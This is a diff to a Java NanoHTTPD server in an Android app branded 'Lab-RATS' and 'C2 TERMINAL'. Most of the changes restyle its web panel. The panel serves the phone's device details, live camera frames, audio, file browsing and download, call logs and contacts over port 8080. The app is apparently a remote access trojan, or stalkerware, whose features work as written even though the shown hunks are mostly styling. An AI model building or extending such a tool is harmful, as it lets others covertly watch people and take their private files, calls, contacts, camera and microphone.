@@ -28,91 +28,200 @@ public class K4N3COHttpServer extends NanoHTTPD {
             "<head>" +
             "<meta charset=\"UTF-8\">" +
             "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">" +
-            "<title>Lab-RATS</title>" +
+            "<title>Lab-RATS | C2 TERMINAL</title>" +
+            "<link href=\"https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700&display=swap\" rel=\"stylesheet\">" +
             "<style>" +
-            "* { margin: 0; padding: 0; box-sizing: border-box; }" +
+            ":root {" +
+            "  --neon-cyan: #00f2ff;" +
+            "  --neon-magenta: #00f2ff;" +
+            "  --neon-green: #39ff14;" +
+            "  --bg-dark: #050505;" +
+            "  --bg-card: rgba(15, 15, 25, 0.8);" +
+            "  --terminal-green: #00ff41;" +
+            "  --danger: #ff3131;" +
+            "}" +
+            "* { margin: 0; padding: 0; box-sizing: border-box; cursor: crosshair; }" +
             "body {" +
-            "font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;" +
-            "background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);" +
-            "min-height: 100vh;" +
-            "color: #e8e8e8;" +
+            "  font-family: 'JetBrains Mono', monospace;" +
+            "  background: var(--bg-dark);" +
+            "  background-image: " +
+            "    radial-gradient(circle at 50% 50%, rgba(0, 242, 255, 0.05) 0%, transparent 50%)," +
+            "    linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%)," +
+            "    linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));" +
+            "  background-size: 100% 100%, 100% 4px, 3px 100%;" +
+            "  min-height: 100vh;" +
+            "  color: #e0e0e0;" +
+            "  overflow-x: hidden;" +
             "}" +
-            ".container { max-width: 1200px; margin: 0 auto; padding: 20px; }" +
-            ".header { text-align: center; padding: 30px 0; border-bottom: 1px solid rgba(255,255,255,0.1); margin-bottom: 30px; }"
-            +
-            ".header h1 { font-size: 2.5rem; background: linear-gradient(90deg, #e94560, #ff6b6b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 10px; }"
-            +
-            ".header p { color: #888; }" +
-            ".nav { display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; margin-bottom: 30px; }" +
-            ".nav a { padding: 12px 20px; background: rgba(255,255,255,0.1); border-radius: 10px; color: #fff; text-decoration: none; transition: all 0.3s ease; border: 1px solid rgba(255,255,255,0.1); font-size: 0.9rem; }"
-            +
-            ".nav a:hover { background: rgba(233, 69, 96, 0.3); border-color: #e94560; transform: translateY(-2px); }" +
-            ".card { background: rgba(255,255,255,0.05); border-radius: 15px; padding: 25px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(10px); }"
-            +
-            ".file-list { list-style: none; }" +
-            ".file-item { display: flex; align-items: center; padding: 15px; margin: 8px 0; background: rgba(255,255,255,0.03); border-radius: 10px; transition: all 0.3s ease; border: 1px solid transparent; }"
-            +
-            ".file-item:hover { background: rgba(255,255,255,0.08); border-color: rgba(233, 69, 96, 0.3); }" +
-            ".file-icon { width: 45px; height: 45px; border-radius: 10px; display: flex; align-items: center; justify-content: center; margin-right: 15px; font-size: 1.3rem; }"
-            +
-            ".folder-icon { background: linear-gradient(135deg, #f39c12, #f1c40f); }" +
-            ".file-icon-default { background: linear-gradient(135deg, #3498db, #2980b9); }" +
-            ".file-icon-image { background: linear-gradient(135deg, #9b59b6, #8e44ad); }" +
-            ".file-icon-video { background: linear-gradient(135deg, #e74c3c, #c0392b); }" +
-            ".file-icon-audio { background: linear-gradient(135deg, #1abc9c, #16a085); }" +
-            ".file-icon-doc { background: linear-gradient(135deg, #2ecc71, #27ae60); }" +
-            ".file-info { flex: 1; }" +
-            ".file-name { color: #fff; text-decoration: none; font-weight: 500; display: block; margin-bottom: 4px; }" +
-            ".file-name:hover { color: #e94560; }" +
-            ".file-meta { font-size: 0.85rem; color: #888; }" +
-            ".breadcrumb { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 20px; padding: 15px; background: rgba(0,0,0,0.2); border-radius: 10px; }"
-            +
-            ".breadcrumb a { color: #e94560; text-decoration: none; }" +
-            ".breadcrumb span { color: #666; }" +
-            "table { width: 100%; border-collapse: collapse; margin-top: 15px; }" +
-            "th, td { padding: 12px 10px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); }" +
-            "th { background: rgba(233, 69, 96, 0.2); color: #e94560; font-weight: 600; font-size: 0.85rem; }" +
-            "td { font-size: 0.9rem; }" +
-            "tr:hover { background: rgba(255,255,255,0.03); }" +
-            ".call-incoming { color: #2ecc71; }" +
-            ".call-outgoing { color: #3498db; }" +
-            ".call-missed { color: #e74c3c; }" +
-            ".contact-avatar { width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #e94560, #ff6b6b); display: flex; align-items: center; justify-content: center; font-weight: bold; margin-right: 12px; }"
-            +
-            ".empty-state { text-align: center; padding: 60px 20px; color: #888; }" +
-            ".empty-state .icon { font-size: 4rem; margin-bottom: 20px; }" +
-            ".info-section { background: rgba(0,0,0,0.2); border-radius: 12px; padding: 20px; margin-bottom: 15px; }" +
-            ".info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 12px; }" +
-            ".info-item { display: flex; justify-content: space-between; padding: 10px 15px; background: rgba(255,255,255,0.03); border-radius: 8px; }"
-            +
-            ".info-label { color: #888; font-size: 0.85rem; }" +
-            ".info-value { color: #fff; font-weight: 500; font-size: 0.85rem; }" +
-            ".pagination { display: flex; justify-content: center; gap: 10px; margin-top: 20px; }" +
-            ".pagination a { padding: 8px 16px; background: rgba(255,255,255,0.1); border-radius: 8px; color: #fff; text-decoration: none; }"
-            +
-            ".pagination a:hover { background: rgba(233, 69, 96, 0.3); }" +
-            ".pagination .active { background: #e94560; }" +
-            "@media (max-width: 768px) { " +
-            ".header h1 { font-size: 1.8rem; } " +
-            ".nav a { padding: 10px 14px; font-size: 0.8rem; } " +
-            "th, td { padding: 8px 6px; font-size: 0.75rem; } " +
-            ".info-grid { grid-template-columns: 1fr; } " +
+            "body::before {" +
+            "  content: \" \";" +
+            "  display: block;" +
+            "  position: fixed;" +
+            "  top: 0; left: 0; bottom: 0; right: 0;" +
+            "  background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));" +
+            "  z-index: 9999;" +
+            "  pointer-events: none;" +
+            "  background-size: 100% 2px, 3px 100%;" +
             "}" +
+            ".container { max-width: 1200px; margin: 0 auto; padding: 20px; position: relative; z-index: 1; }" +
+            ".header {" +
+            "  text-align: center;" +
+            "  padding: 40px 0;" +
+            "  border-bottom: 1px solid var(--neon-cyan);" +
+            "  margin-bottom: 30px;" +
+            "  box-shadow: 0 0 20px rgba(0, 242, 255, 0.2);" +
+            "  background: rgba(0, 242, 255, 0.02);" +
+            "  clip-path: polygon(0 0, 100% 0, 100% 80%, 95% 100%, 0 100%);" +
+            "}" +
+            ".header h1 {" +
+            "  font-family: 'Orbitron', sans-serif;" +
+            "  font-size: 3rem;" +
+            "  color: var(--neon-cyan);" +
+            "  text-transform: uppercase;" +
+            "  letter-spacing: 8px;" +
+            "  text-shadow: 0 0 10px var(--neon-cyan), 0 0 20px var(--neon-cyan);" +
+            "  margin-bottom: 10px;" +
+            "  animation: glitch 1s infinite alternate;" +
+            "}" +
+            "@keyframes glitch {" +
+            "  0% { transform: skew(0deg); }" +
+            "  20% { transform: skew(-1deg); text-shadow: 2px 0 var(--neon-cyan); }" +
+            "  40% { transform: skew(1deg); text-shadow: -2px 0 var(--neon-cyan); }" +
+            "  100% { transform: skew(0deg); }" +
+            "}" +
+            "@keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }" +
+            ".nav { display: flex; gap: 15px; flex-wrap: wrap; justify-content: center; margin-bottom: 40px; }" +
+            ".nav a {" +
+            "  padding: 12px 25px;" +
+            "  background: transparent;" +
+            "  border: 1px solid var(--neon-cyan);" +
+            "  color: var(--neon-cyan);" +
+            "  text-decoration: none;" +
+            "  text-transform: uppercase;" +
+            "  font-size: 0.8rem;" +
+            "  letter-spacing: 2px;" +
+            "  transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);" +
+            "  position: relative;" +
+            "  overflow: hidden;" +
+            "}" +
+            ".nav a:hover {" +
+            "  background: var(--neon-cyan);" +
+            "  color: var(--bg-dark);" +
+            "  box-shadow: 0 0 30px var(--neon-cyan);" +
+            "}" +
+            ".card {" +
+            "  background: var(--bg-card);" +
+            "  border-left: 4px solid var(--neon-magenta);" +
+            "  border-radius: 4px;" +
+            "  padding: 30px;" +
+            "  margin-bottom: 25px;" +
+            "  border-right: 1px solid rgba(255, 0, 255, 0.1);" +
+            "  border-top: 1px solid rgba(255, 0, 255, 0.1);" +
+            "  border-bottom: 1px solid rgba(255, 0, 255, 0.1);" +
+            "  backdrop-filter: blur(15px);" +
+            "  box-shadow: 10px 10px 20px rgba(0,0,0,0.5);" +
+            "  position: relative;" +
+            "}" +
+            ".card::after {" +
+            "  content: \"SYS_READY\";" +
+            "  position: absolute;" +
+            "  top: 10px; right: 15px;" +
+            "  font-size: 0.6rem;" +
+            "  color: var(--neon-magenta);" +
+            "  opacity: 0.5;" +
+            "}" +
+            "h2, h3 { font-family: 'Orbitron', sans-serif; text-transform: uppercase; letter-spacing: 3px; margin-bottom: 20px; color: var(--neon-cyan); }" +
+            "table { width: 100%; border-collapse: separate; border-spacing: 0 8px; margin-top: 15px; }" +
+            "th { background: rgba(0, 242, 255, 0.1); color: var(--neon-cyan); text-transform: uppercase; font-size: 0.75rem; letter-spacing: 2px; padding: 15px; text-align: left; border-bottom: 2px solid var(--neon-cyan); }" +
+            "td { background: rgba(255,255,255,0.02); padding: 15px; font-size: 0.85rem; border-top: 1px solid rgba(255,255,255,0.05); border-bottom: 1px solid rgba(255,255,255,0.05); }" +
+            "tr:hover td { background: rgba(0, 242, 255, 0.05); color: var(--neon-cyan); }" +
+            ".file-item { display: flex; align-items: center; background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); border-left: 3px solid var(--neon-cyan); margin: 10px 0; padding: 12px 15px; transition: all 0.3s; gap: 15px; }" +
+            ".file-item:hover { transform: translateX(10px); background: rgba(0, 242, 255, 0.05); border-color: var(--neon-cyan); }" +
+            ".info-item { background: rgba(0,0,0,0.3); border: 1px solid rgba(0, 242, 255, 0.1); padding: 15px; }" +
+            ".info-label { color: var(--neon-cyan); opacity: 0.7; font-size: 0.7rem; text-transform: uppercase; }" +
+            ".info-value { color: var(--neon-green); font-family: 'JetBrains Mono', monospace; }" +
+            "button, .btn {" +
+            "  background: transparent;" +
+            "  border: 1px solid var(--neon-green);" +
+            "  color: var(--neon-green);" +
+            "  padding: 10px 20px;" +
+            "  text-transform: uppercase;" +
+            "  letter-spacing: 2px;" +
+            "  transition: all 0.3s;" +
+            "  box-shadow: inset 0 0 0 0 var(--neon-green);" +
+            "}" +
+            "button:hover, .btn:hover { background: var(--neon-green); color: var(--bg-dark); box-shadow: 0 0 20px var(--neon-green); }" +
+            ".btn-small { padding: 6px 12px; font-size: 0.7rem; min-width: 80px; text-align: center; white-space: nowrap; }" +
+            ".empty-state .icon { color: var(--danger); text-shadow: 0 0 10px var(--danger); }" +
+            ".glitch-text {" +
+            "  color: var(--neon-cyan);" +
+            "  font-size: 0.6rem;" +
+            "  letter-spacing: 3px;" +
+            "  text-transform: uppercase;" +
+            "  margin-top: 5px;" +
+            "  position: relative;" +
+            "  animation: static-glitch 12s infinite;" +
+            "}" +
+            "@keyframes static-glitch {" +
+            "  0%, 10%, 100% { transform: translate(0) scale(1); color: var(--neon-cyan); opacity: 1; }" +
+            "  1% { transform: translate(-3px) scaleX(1.1); color: #fff; opacity: 0.8; }" +
+            "  2% { transform: translate(3px) scaleX(0.9); color: var(--neon-cyan); }" +
+            "  3% { transform: translate(-1px) scaleX(1.05); color: #fff; }" +
+            "  4% { transform: translate(0) scale(1); color: var(--neon-cyan); }" +
+            "  5% { transform: translate(2px) scaleX(1.1); color: #fff; }" +
+            "  6% { transform: translate(0) scale(1); color: var(--neon-cyan); }" +
+            "}" +
+            "@media (max-width: 768px) {" +
+            "  .header h1 { font-size: 1.8rem; letter-spacing: 4px; }" +
+            "  .nav a { padding: 8px 12px; font-size: 0.7rem; }" +
+            "}" +
+            ".contact-avatar {" +
+            "  width: 40px; height: 40px;" +
+            "  border-radius: 50%;" +
+            "  background: linear-gradient(135deg, var(--neon-magenta), var(--neon-cyan));" +
+            "  display: flex; align-items: center; justify-content: center;" +
+            "  font-weight: bold; margin-right: 15px;" +
+            "  color: var(--bg-dark);" +
+            "  box-shadow: 0 0 10px rgba(255, 0, 255, 0.5);" +
+            "}" +
+            ".call-incoming { color: var(--neon-green); }" +
+            ".call-outgoing { color: var(--neon-cyan); }" +
+            ".call-missed { color: var(--danger); }" +
+            ".file-icon { width: 45px; height: 45px; min-width: 45px; border-radius: 4px; display: flex; align-items: center; justify-content: center; font-size: 1.2rem; }" +
+            ".folder-icon { background: rgba(243, 156, 18, 0.2); border: 1px solid #f39c12; color: #f39c12; }" +
+            ".file-icon-default { background: rgba(52, 152, 219, 0.2); border: 1px solid #3498db; color: #3498db; }" +
+            ".pagination { display: flex; justify-content: center; gap: 10px; margin-top: 25px; }" +
+            ".pagination a { padding: 8px 16px; background: var(--bg-card); border: 1px solid var(--neon-cyan); color: var(--neon-cyan); text-decoration: none; }" +
+            ".pagination .active { background: var(--neon-cyan); color: var(--bg-dark); }" +
+            ".breadcrumb { display: flex; align-items: center; background: rgba(0,0,0,0.4); padding: 10px 20px; border-radius: 4px; margin-bottom: 20px; border: 1px solid rgba(0, 242, 255, 0.2); font-size: 0.8rem; overflow-x: auto; white-space: nowrap; }" +
+            ".breadcrumb a { color: var(--neon-cyan); text-decoration: none; padding: 2px 8px; border-radius: 3px; transition: background 0.2s; }" +
+            ".breadcrumb a:hover { background: rgba(0, 242, 255, 0.1); }" +
+            ".breadcrumb span { color: var(--neon-magenta); margin: 0 5px; font-weight: bold; }" +
+            ".file-list { list-style: none; display: grid; grid-template-columns: 1fr; gap: 10px; }" +
+            ".file-info { display: flex; flex-direction: column; flex: 1; min-width: 0; }" +
+            ".file-name { color: #fff; text-decoration: none; font-weight: bold; font-size: 0.95rem; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; margin-bottom: 2px; }" +
+            ".file-name:hover { color: var(--neon-cyan); text-shadow: 0 0 5px var(--neon-cyan); }" +
+            ".file-meta { font-size: 0.7rem; color: #888; font-family: 'JetBrains Mono', monospace; letter-spacing: 1px; }" +
+            ".file-icon-image { background: rgba(155, 89, 182, 0.2); border: 1px solid #9b59b6; color: #9b59b6; }" +
+            ".file-icon-video { background: rgba(231, 76, 60, 0.2); border: 1px solid #e74c3c; color: #e74c3c; }" +
+            ".file-icon-audio { background: rgba(26, 188, 156, 0.2); border: 1px solid #1abc9c; color: #1abc9c; }" +
+            ".file-icon-doc { background: rgba(46, 204, 113, 0.2); border: 1px solid #2ecc71; color: #2ecc71; }" +
             "</style>" +
             "</head>" +
             "<body>" +
             "<div class=\"container\">" +
             "<div class=\"header\">" +
-            "<img src=\"/logo\" alt=\"Logo\" style=\"width: 150px; height: auto; margin-bottom: 15px; border-radius: 10px;\">" +
             "<h1>Lab-RATS</h1>" +
+            "<p style=\"color: var(--neon-cyan); font-size: 0.7rem; opacity: 0.6; letter-spacing: 5px;\">REMOTE ACCESS TERMINAL v4.0.26</p>" +
+            "<div class=\"glitch-text\">Developed by K4N3CO.LABS</div>" +
             "</div>" +
             "<div class=\"nav\">" +
-            "<a href=\"/\">Home</a>" +
-            "<a href=\"/device\">Device Info</a>" +
-            "<a href=\"/camera\">Camera</a>" +
-            "<a href=\"/audio\">Audio</a>" +
-            "<a href=\"/files\">Files</a>" +
-            "<a href=\"/calls\">Call Logs</a>" +
+            "<a href=\"/\">Terminal</a>" +
+            "<a href=\"/device\">Hardware</a>" +
+            "<a href=\"/camera\">Optics</a>" +
+            "<a href=\"/audio\">Acoustics</a>" +
+            "<a href=\"/files\">Data</a>" +
+            "<a href=\"/calls\">Comms</a>" +
             "<a href=\"/contacts\">Contacts</a>" +
             "</div>";
 
@@ -209,70 +318,73 @@ public class K4N3COHttpServer extends NanoHTTPD {
 
     private Response serveHome() {
         String ip = MainActivity.getLocalIpAddress();
-        String ipDisplay = (ip != null ? ip : "Not Available");
+        String ipDisplay = (ip != null ? ip : "NOT_DETECTED");
 
-        String html = HTML_HEADER +
-                "<div class=\"card\">" +
-                "<h2 style=\"margin-bottom: 20px;\">Device Status</h2>" +
-                "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px;\">"
-                +
-                "<div style=\"padding: 20px; background: rgba(46, 204, 113, 0.1); border-radius: 10px; border-left: 4px solid #2ecc71;\">"
-                +
-                "<div style=\"font-size: 0.9rem; color: #888;\">Server Status</div>" +
-                "<div style=\"font-size: 1.3rem; font-weight: bold; color: #2ecc71;\">Online</div>" +
-                "</div>" +
-                "<div style=\"padding: 20px; background: rgba(52, 152, 219, 0.1); border-radius: 10px; border-left: 4px solid #3498db;\">"
-                +
-                "<div style=\"font-size: 0.9rem; color: #888;\">Port</div>" +
-                "<div style=\"font-size: 1.3rem; font-weight: bold; color: #3498db;\">8080</div>" +
-                "</div>" +
-                "<div style=\"padding: 20px; background: rgba(233, 69, 96, 0.1); border-radius: 10px; border-left: 4px solid #e94560;\">"
-                +
-                "<div style=\"font-size: 0.9rem; color: #888;\">IP Address</div>" +
-                "<div style=\"font-size: 0.9rem; font-weight: bold; color: #e94560; word-break: break-all;\">"
-                + ipDisplay + "</div>" +
-                "</div>" +
-                "</div>" +
-                "</div>" +
-                "<div class=\"card\">" +
-                "<h2 style=\"margin-bottom: 20px;\">Quick Access</h2>" +
-                "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px;\">"
-                +
-                "<a href=\"/device\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(155, 89, 182, 0.2), rgba(142, 68, 173, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(155, 89, 182, 0.3);\">"
-                +
-                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128241;</div>" +
-                "<div style=\"color: #9b59b6; font-weight: 600; font-size: 0.9rem;\">Device Info</div>" +
-                "</a>" +
-                "<a href=\"/files\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(52, 152, 219, 0.2), rgba(41, 128, 185, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(52, 152, 219, 0.3);\">"
-                +
-                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128193;</div>" +
-                "<div style=\"color: #3498db; font-weight: 600; font-size: 0.9rem;\">File Manager</div>" +
-                "</a>" +
-                "<a href=\"/calls\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(46, 204, 113, 0.2), rgba(39, 174, 96, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(46, 204, 113, 0.3);\">"
-                +
-                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128222;</div>" +
-                "<div style=\"color: #2ecc71; font-weight: 600; font-size: 0.9rem;\">Call Logs</div>" +
-                "</a>" +
-                "<a href=\"/contacts\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(230, 126, 34, 0.2), rgba(211, 84, 0, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(230, 126, 34, 0.3);\">"
-                +
-                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128101;</div>" +
-                "<div style=\"color: #e67e22; font-weight: 600; font-size: 0.9rem;\">Contacts</div>" +
-                "</a>" +
-                "<a href=\"/camera\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(231, 76, 60, 0.2), rgba(192, 57, 43, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(231, 76, 60, 0.3);\">"
-                +
-                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128247;</div>" +
-                "<div style=\"color: #e74c3c; font-weight: 600; font-size: 0.9rem;\">Camera</div>" +
-                "</a>" +
-                "<a href=\"/audio\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(26, 188, 156, 0.2), rgba(22, 160, 133, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(26, 188, 156, 0.3);\">"
-                +
-                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#127908;</div>" +
-                "<div style=\"color: #1abc9c; font-weight: 600; font-size: 0.9rem;\">Audio</div>" +
-                "</a>" +
-                "</div>" +
-                "</div>" +
-                HTML_FOOTER;
+        StringBuilder html = new StringBuilder(HTML_HEADER);
+        
+        // Status Monitor Card
+        html.append("<div class=\"card\">");
+        html.append("<h2 style=\"margin-bottom: 25px;\">SYSTEM_MONITOR v4.0</h2>");
+        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px;\">");
+        
+        // Server Status
+        html.append("<div style=\"padding: 20px; background: rgba(57, 255, 20, 0.05); border: 1px solid var(--neon-green); border-left-width: 5px; box-shadow: 0 0 10px rgba(57, 255, 20, 0.1);\">");
+        html.append("<div class=\"info-label\">UPLINK_STATUS</div>");
+        html.append("<div style=\"font-size: 1.5rem; font-weight: bold; color: var(--neon-green); text-shadow: 0 0 5px var(--neon-green);\">ONLINE</div>");
+        html.append("</div>");
+        
+        // Port
+        html.append("<div style=\"padding: 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-left-width: 5px; box-shadow: 0 0 10px rgba(0, 242, 255, 0.1);\">");
+        html.append("<div class=\"info-label\">ACCESS_PORT</div>");
+        html.append("<div style=\"font-size: 1.5rem; font-weight: bold; color: var(--neon-cyan); text-shadow: 0 0 5px var(--neon-cyan);\">8080</div>");
+        html.append("</div>");
+        
+        // IP
+        html.append("<div style=\"padding: 20px; background: rgba(255, 0, 255, 0.05); border: 1px solid var(--neon-magenta); border-left-width: 5px; box-shadow: 0 0 10px rgba(255, 0, 255, 0.1);\">");
+        html.append("<div class=\"info-label\">VIRTUAL_ADDRESS</div>");
+        html.append("<div style=\"font-size: 1rem; font-weight: bold; color: var(--neon-magenta); word-break: break-all;\">").append(ipDisplay).append("</div>");
+        html.append("</div>");
+        
+        html.append("</div>");
+        html.append("</div>");
 
-        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+        // Quick Access Terminal
+        html.append("<div class=\"card\">");
+        html.append("<h2 style=\"margin-bottom: 25px;\">QUICK_ACCESS_NODES</h2>");
+        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px;\">");
+
+        // Node definitions
+        String[][] nodes = {
+            {"/device", "Hardware", "&#128241;", "var(--neon-cyan)"},
+            {"/files", "Data", "&#128193;", "var(--neon-green)"},
+            {"/calls", "Comms", "&#128222;", "var(--neon-magenta)"},
+            {"/contacts", "Contacts", "&#128101;", "#f39c12"},
+            {"/camera", "Optics", "&#128247;", "var(--danger)"},
+            {"/audio", "Acoustics", "&#127908;", "#1abc9c"}
+        };
+
+        for (String[] node : nodes) {
+            html.append("<a href=\"").append(node[0]).append("\" style=\"padding: 25px 15px; background: rgba(255,255,255,0.02); border-radius: 4px; text-decoration: none; text-align: center; border: 1px solid ").append(node[3]).append("; opacity: 0.8; transition: all 0.3s;\">");
+            html.append("<div style=\"font-size: 2.2rem; margin-bottom: 15px; filter: drop-shadow(0 0 5px ").append(node[3]).append(");\">").append(node[2]).append("</div>");
+            html.append("<div style=\"color: ").append(node[3]).append("; font-weight: 600; font-size: 0.8rem; letter-spacing: 2px; text-transform: uppercase;\">").append(node[1]).append("</div>");
+            html.append("</a>");
+        }
+
+        html.append("</div>");
+        html.append("</div>");
+        
+        // System Log Preview (Cyber effect)
+        html.append("<div class=\"card\" style=\"border-left-color: var(--neon-cyan);\">");
+        html.append("<h3 style=\"font-size: 0.8rem; opacity: 0.7;\">SESSION_LOGS</h3>");
+        html.append("<div style=\"background: #000; padding: 15px; border-radius: 4px; font-size: 0.75rem; color: var(--terminal-green); line-height: 1.6; font-family: 'JetBrains Mono', monospace;\">");
+        html.append("<div>[SUCCESS] Uplink established at ").append(new java.util.Date()).append("</div>");
+        html.append("<div>[INFO] Device model: ").append(android.os.Build.MODEL).append(" detected</div>");
+        html.append("<div>[INFO] Encrypted bridge active... waiting for command</div>");
+        html.append("</div>");
+        html.append("</div>");
+
+        html.append(HTML_FOOTER);
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
     }
 
     private Response serveDeviceInfo() {
@@ -303,9 +415,10 @@ public class K4N3COHttpServer extends NanoHTTPD {
 
         StringBuilder html = new StringBuilder(HTML_HEADER);
 
-        // Breadcrumb
+        // Breadcrumb Trail
         html.append("<div class=\"breadcrumb\">");
-        html.append("<a href=\"/files\">Storage</a>");
+        html.append("<span style=\"color: var(--neon-green); margin-right: 10px;\">root@K4N3CO:~$</span>");
+        html.append("<a href=\"/files\">storage</a>");
 
         if (!path.isEmpty()) {
             String[] parts = path.split("/");
@@ -314,15 +427,20 @@ public class K4N3COHttpServer extends NanoHTTPD {
                 if (!part.isEmpty()) {
                     pathBuilder.append("/").append(part);
                     html.append("<span>/</span>");
-                    html.append("<a href=\"/files").append(pathBuilder).append("\">").append(part).append("</a>");
+                    html.append("<a href=\"/files").append(pathBuilder).append("\">").append(part.toLowerCase()).append("</a>");
                 }
             }
         }
+        html.append("<span style=\"margin-left: 10px; color: var(--neon-cyan); animation: blink 1s infinite;\">_</span>");
         html.append("</div>");
 
         html.append("<div class=\"card\">");
-        html.append("<h2 style=\"margin-bottom: 20px;\">").append(path.isEmpty() ? "Storage" : currentDir.getName())
-                .append("</h2>");
+        html.append("<div style=\"display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; border-bottom: 1px solid rgba(0, 242, 255, 0.1); padding-bottom: 15px;\">");
+        html.append("<h2 style=\"margin-bottom: 0; font-size: 1.2rem;\">")
+            .append(path.isEmpty() ? "SYSTEM_STORAGE" : "DIR: " + currentDir.getName().toUpperCase())
+            .append("</h2>");
+        html.append("<span style=\"font-size: 0.7rem; color: var(--neon-green); opacity: 0.8;\">MODE: SECURE_ACCESS</span>");
+        html.append("</div>");
 
         File[] files = currentDir.listFiles();
         if (files != null && files.length > 0) {
@@ -346,25 +464,26 @@ public class K4N3COHttpServer extends NanoHTTPD {
                 html.append("<li class=\"file-item\">");
                 html.append("<div class=\"file-icon ").append(iconClass).append("\">").append(icon).append("</div>");
                 html.append("<div class=\"file-info\">");
-                html.append("<a class=\"file-name\" href=\"/files/").append(filePath).append("\">").append(fileName)
-                        .append("</a>");
+                html.append("<a class=\"file-name\" href=\"/files/").append(filePath).append("\">").append(fileName).append("</a>");
+                
                 html.append("<div class=\"file-meta\">");
-
                 if (file.isDirectory()) {
                     File[] subFiles = file.listFiles();
                     int count = subFiles != null ? subFiles.length : 0;
-                    html.append("Folder - ").append(count).append(" items");
+                    html.append("<span style=\"color: #f39c12;\">DIRECTORY</span> &nbsp;|&nbsp; ").append(count).append(" OBJECTS");
                 } else {
-                    html.append(formatFileSize(file.length())).append(" - ");
-                    html.append(new SimpleDateFormat("MMM dd, yyyy", Locale.getDefault())
-                            .format(new Date(file.lastModified())));
+                    String ext = "";
+                    int i = fileName.lastIndexOf('.');
+                    if (i > 0) ext = fileName.substring(i+1).toUpperCase();
+                    html.append("<span style=\"color: var(--neon-cyan);\">").append(ext.isEmpty() ? "FILE" : ext).append("</span> &nbsp;|&nbsp; ");
+                    html.append(formatFileSize(file.length())).append(" &nbsp;|&nbsp; ");
+                    html.append(new SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(new Date(file.lastModified())));
                 }
-
                 html.append("</div></div>");
 
                 if (file.isFile()) {
-                    html.append("<a href=\"/download/").append(filePath)
-                            .append("\" style=\"padding: 8px 16px; background: rgba(233, 69, 96, 0.2); border-radius: 8px; color: #e94560; text-decoration: none; font-size: 0.85rem;\">Download</a>");
+                    html.append("<a class=\"btn btn-small\" href=\"/download/").append(filePath)
+                            .append("\">FETCH</a>");
                 }
 
                 html.append("</li>");
@@ -1194,7 +1313,7 @@ public class K4N3COHttpServer extends NanoHTTPD {
         html.append(
                 "<div id=\"stream-container\" style=\"position: relative; display: inline-block; background: #000; border-radius: 10px; overflow: hidden; min-height: 180px;\">");
         html.append(
-                "<img id=\"stream\" src=\"/camera/frame\" style=\"max-width: 100%; height: auto; display: block; transform: rotate(270deg);\" ");
+                "<img id=\"stream\" src=\"/camera/frame\" style=\"max-width: 100%; height: auto; display: block; transition: transform 0.3s ease;\" ");
         html.append("onerror=\"handleStreamError()\" onload=\"streamLoaded()\" />");
         html.append(
                 "<div id=\"stream-overlay\" style=\"position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.7); padding: 5px 10px; border-radius: 5px; font-size: 0.8rem;\">");
@@ -1250,6 +1369,8 @@ public class K4N3COHttpServer extends NanoHTTPD {
         // Action buttons
         html.append("<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;\">");
         html.append(
